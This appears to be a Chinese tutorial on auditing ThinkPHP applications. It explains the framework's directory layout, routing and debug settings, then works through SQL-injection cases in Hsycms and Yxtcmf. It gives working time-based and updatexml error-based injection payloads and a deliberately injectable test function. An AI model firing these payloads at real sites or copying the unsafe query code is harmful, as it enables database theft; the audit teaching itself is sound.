```php
#知识点：
1、认识PHP开发框架TP
2、掌握TP文件目录含义   
3、掌握查找入口目录版本 
4、掌握路由URL对应文件块  
5、掌握配置代码调试开和关
6、掌握TP5代码书写安全规范
```

1、解释TP框架开发的源码审计要点

```php
目录和文件
目录使用小写+下划线；
类库、函数文件统一以 .php 为后缀；
类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；
类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；
类名和类文件名保持一致，统一采用驼峰法命名（首字母大写）；
函数和类、属性命名
类的命名采用驼峰法（首字母大写），例如 User 、 UserType ，默认不需要添加后缀，例如
UserController 应该直接命名为 User ；
函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 get_client_ip ；
方法的命名使用驼峰法（首字母小写），例如 getUserName ；
属性的命名使用驼峰法（首字母小写），例如 tableName 、 instance ；
以双下划线“__”打头的函数或方法作为魔术方法，例如 __call 和 __autoload ；
常量和配置
常量以大写字母和下划线命名，例如 APP_PATH 和 THINK_PATH ；
配置参数以小写字母和下划线命名，例如 url_route_on 和 url_convert ；
数据表和字段
数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和
user_name 字段，不建议使用驼峰和中文作为数据表字段命名。
应用类库命名空间规范
应用类库的根命名空间统一为app（不建议更改，可以设置 app_namespace 配置参数更改， V5.0.8 版本
开始使用 APP_NAMESPACE 常量定义）；
例如：app\index\controller\Index 和 app\index\model\User
```

2、参考开发手册学习文件目录含义  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-64f0112a586b173850683b51e1b80ca4431b580a.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-64f0112a586b173850683b51e1b80ca4431b580a.jpg)  
3、参考开发手册学习寻找入口目录

```php
入口文件定义
入口文件主要完成：
定义框架路径、项目路径（可选）
定义系统相关常量（可选）
载入框架入口文件（必须）
```

5.0默认的应用入口文件位于 public/index.php ，内容如下：

```php
// 定义应用目录  则application目录下的文件为核心代码 
define('APP_PATH', __DIR__ . '/../application/');
// 加载框架引导文件
require __DIR__ . '/../thinkphp/start.php';
```

4、参考开发手册学习寻找URL对应文件

```php
URL设计
ThinkPHP 5.0 在没有启用路由的情况下典型的URL访问规则是：
http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]
支持切换到命令行访问，如果切换到命令行模式下面的访问规则是：
>php.exe index.php(或者其它应用入口文件） 模块/控制器/操作/[参数名/参数值...]
可以看到，无论是URL访问还是命令行访问，都采用 PATH_INFO 访问地址，其中 PATH_INFO 的分隔符是
可以设置的。
注意：5.0 取消了URL模式的概念，并且普通模式的URL访问不再支持，但参数可以支持普通方式传值，例
如：
>php.exe index.php(或者其它应用入口文件） 模块/控制器/操作?参数名=参数值&...
如果不支持PATHINFO的服务器可以使用兼容模式访问如下：
http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]
必要的时候，我们可以通过某种方式，省略URL里面的模块和控制器。
URL大小写
默认情况下， URL 是不区分大小写的，也就是说 URL 里面的模块/控制器/操作名会自动转换为小写，控制
器在最后调用的时候会转换为驼峰法处理。
例如：
http://localhost/index.php/Index/Blog/read
// 和下面的访问是等效的
http://localhost/index.php/index/blog/read
如果访问下面的地址
http://localhost/index.php/Index/BlogTest/read
// 和下面的访问是等效的
http://localhost/index.php/index/blogtest/read
在这种URL不区分大小写情况下，如果要访问驼峰法的控制器类，则需要使用：
URL访问
本文档使用 看云 构建 - 30 -http://localhost/index.php/Index/blog_test/read
模块名和操作名会直接转换为小写处理。
如果希望 URL 访问严格区分大小写，可以在应用配置文件中设置：
// 关闭URL中控制器和操作名的自动转换
'url_convert' => false,
一旦关闭自动转换，URL地址中的控制器名就变成大小写敏感了，例如前面的访问地址就要写成：
http://localhost/index.php/Index/BlogTest/read
但是下面的URL访问依然是有效的：
http://localhost/index.php/Index/blog_test/read
下面的URL访问则无效：
http://localhost/index.php/Index/blogtest/read
```

5、参考开发手册学习如何开启调试模式

```php
    // 应用调试模式
    'app_debug'              => true,
    // 应用Trace
    'app_trace'              => true,
```

\[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9e7d663fe3567f5947f0fc2cae8701e62436f27c.jpg)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-26205fe61aad10bbffec4fb5d191472805703fbf.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-26205fe61aad10bbffec4fb5d191472805703fbf.jpg)  
6、参考开发手册学习规矩写法和不安全写法。  
参考手册-TP5开发手册PDF-为了掌握了解框架  
首页文件看APP\_PATH定义-为了后期分析核心代码  
全局搜索：THINK\_VERSION，-为了后期分析此版本是否存在漏洞

TP知识点-架构&amp;入口&amp;路由&amp;调试&amp;写法安全
--------------------------------------

url 对应文件  
查看index入口文件 发现核心代码在 application 目录下  
访问Idenx文件里test函数  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e4f8df3e60b2da672297db39942e665ab865a964.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e4f8df3e60b2da672297db39942e665ab865a964.jpg)

```php
url: 
http://127.0.0.1/tp5/public/index.php/index/index/test
```

访问xiaodi函数

```php
url:
http://127.0.0.1/tp5/public/index.php/index/index/xiaodi?i=1
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9771f99c77c8437e3332a7efeb0e568f5f646462.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9771f99c77c8437e3332a7efeb0e568f5f646462.jpg)

```php

// Test.php
{
    //index.php/index/test/x
  public function x()
{
    echo 'x test';
  }

  public function testsqlin()
{  
    //自写数据库查询，存在注入
    $id=$_GET['x'];
    $conn=mysql_connect("127.0.0.1","root","root");
    $sql="select * from injection.users where id=$id";
    echo $sql;
    $result=mysql_query($sql,$conn);
  }

  public function testsqlin1()
{
    //table('users')->where('id',1)->select();
        //$id=input('?get.id');
        $id=input('id');
        db('users')->field('id')->where('id',$id)->select();
  }

  public function index()
{
        $username = request()->get('id/a');
        db('users')->insert(['id' => $username]);
        return 'Update success';
    }

}
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d3925c069444de335d91034c8f30b1b1c507256f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d3925c069444de335d91034c8f30b1b1c507256f.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fbe15fa9c0a6b1c3f6bdad8a756ddaee8f3c7556.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-fbe15fa9c0a6b1c3f6bdad8a756ddaee8f3c7556.jpg)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-abd1b57e7dbd543bea94e7c40b1a3573f5fd0515.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-abd1b57e7dbd543bea94e7c40b1a3573f5fd0515.jpg)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c96989a540e5390cd80f02110a4d2e7edeeda3c2.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c96989a540e5390cd80f02110a4d2e7edeeda3c2.jpg)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b487c649d7ca8f33c372b724a9188b434c9c19f3.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b487c649d7ca8f33c372b724a9188b434c9c19f3.jpg)

```php
url:
http://127.0.0.1/tp5/public/index.php/xiaodi/Index/test
http://127.0.0.1/tp5/public/index.php/xiaodi/Index/xiaodi
```

总体来说，就是url的每一个单词都对应后台每一个目录文件最后一个对应代码中的函数。

代码审计-案例1-Hsycms\_Tp5框架注入
------------------------

```php
#代码审计-案例1-Hsycms_Tp5框架注入&逻辑(没有完整安全写法)
流程：入口-版本-调试-路由-特定漏洞特性写法搜索或版本漏洞触发关键字
1.注入input：and if(1<2,sleep(2),sleep(0)) and (1=1.html
```

第一步 打开index文件 查看入口 /app目录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2c4d3e14670aa71ff39f191407f86663c194cf56.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-2c4d3e14670aa71ff39f191407f86663c194cf56.jpg)  
第二步 查看版本 think\_version  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-150fe208cd29aed31e879da79cc8abc216cedec3.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-150fe208cd29aed31e879da79cc8abc216cedec3.jpg)  
第三步 调试 app\_debug  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a023ea28a593c0bf965c78292b83331b2725d93a.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a023ea28a593c0bf965c78292b83331b2725d93a.jpg)  
第四步 网站查看文件流程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7902f74b7f445ba47e89d82ecaa0a3ad0e1617d1.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7902f74b7f445ba47e89d82ecaa0a3ad0e1617d1.jpg)  
开启sql监控，查看执行流程  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5a887c306990aa21cc0e37dce7380eb4767c51ca.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5a887c306990aa21cc0e37dce7380eb4767c51ca.jpg)  
分析代码 input 获取id参数，$one = db('article')-&gt;where('id',$id) 等价于  
select \* from article where id = $id; 伪静态注入，在html前添加参数

```php
 public function index()
{
    $id = input('id');
    // 添加调试
    echo $id;

    $one  = db('article')->where('id',$id)->find();      
    if(empty($one)){ exit("文章不存在");}    
    $navrow = db('nav')->where('id',$one['nid'])->find();    
    $data['showcate'] = $navrow['showcate'];    
    $data['entitle']  = $navrow['entitle'];
    $data['columnName'] = $navrow['title'];
    $data["banner"]   = isMobile() ? $navrow['img1'] : $navrow['img'];
    $data['id'] = $id;
    $view['views'] = $one['views']+1;
    db('article')->where('id',$id)->update($view);//浏览次数        
    //无分类
    if($data['showcate']==0){       
      $data["leftlist"] = db('article')->field('id,title')->where('nid',$one['nid'])->order("sort,id")->select();            
    }
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7534987bcf6b3a9a23184b428b46e66f7e42f436.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7534987bcf6b3a9a23184b428b46e66f7e42f436.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-447be651fb2d290f4d8fb8c636b78eeeafda4050.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-447be651fb2d290f4d8fb8c636b78eeeafda4050.jpg)

```php
UPDATE `sy_article` SET `views`=49 WHERE `id` = '133 and 222=222'
SELECT `id`,`title` FROM `sy_article` WHERE ( id < 133 and 222=222 and nid=3 and cid=34 ) ORDER BY `id` DESC LIMIT 1
```

添加单引号闭合  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3e93e258977c35695aec88c08c8af6fbc9355a38.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3e93e258977c35695aec88c08c8af6fbc9355a38.jpg)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c4d21416388ed76c51dbe96eddb713e29a5dd959.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c4d21416388ed76c51dbe96eddb713e29a5dd959.jpg)  
仅执行了第一条sql语句 并且单引号转义了  
尝试执行第二条 延迟五秒 存在延迟注入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-48683ce54e5619fe4f3a74b84c864fb908e8311d.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-48683ce54e5619fe4f3a74b84c864fb908e8311d.jpg)

代码审计-案例2-Yxtcmf\_Tp3本身框架SQL注入
-----------------------------

```php

#代码审计-案例2-Yxtcmf_Tp3本身框架SQL注入（本身的框架漏洞）
流程：入口-版本-调试-路由-特定漏洞特性写法搜索或版本漏洞触发关键字
参考：https://y4er.com/post/thinkphp3-vuln/
password=123456&repassword=123456&tel[0]=exp&tel[1]=='111' and updatexml(1,concat(0x7e,user(),0x7e),1)#
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-25d993b9eda1a5f34d55dd0ef91002eedd8ca9a7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-25d993b9eda1a5f34d55dd0ef91002eedd8ca9a7.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-de6781a6271453bc61891ef3f32cfd42a067bac6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-de6781a6271453bc61891ef3f32cfd42a067bac6.png)

结合版本 百度搜历史漏洞  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-06d1b59b6c1a3916f0651abdbfc977d0af409956.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-06d1b59b6c1a3916f0651abdbfc977d0af409956.png)  
搜索where关键字  
yxtcmf\\application\\User\\Controller\\RegisterController.class.php  
直接获取参数 无任何过滤

```php
function repassword(){
    $users_model=M("Users");
    $mobile_verify=$_POST['mobileCode'];
    $password=$_POST['password'];
    $repassword=$_POST['repassword'];
    $mobile=$_POST['tel'];
    $where['mobile']=$mobile;
      if(strlen($password) < 5 || strlen($password) > 20){
      $result['code']='password';
      $result['success']=false;
      $result['message']="密码长度至少5位，最多20位！";
      }elseif($password !=$repassword){
      $result['code']='repassword';
      $result['success']=false;
      $result['message']="两次密码不一致！";
      }elseif($mobile_verify =$_SESSION['mobile_verify']){
      $result['code']='mobile_verify';
      $result['success']=false;
      $result['message']="手机验证码不正确！";
    }elseif(!$users_model->where($where)->find()){
      $result['code']='user';
      $result['success']=false;
      $result['message']="该手机号未注册！";
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a983fce19e9caaf111d4496f4ce4d7626d7807a1.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a983fce19e9caaf111d4496f4ce4d7626d7807a1.png)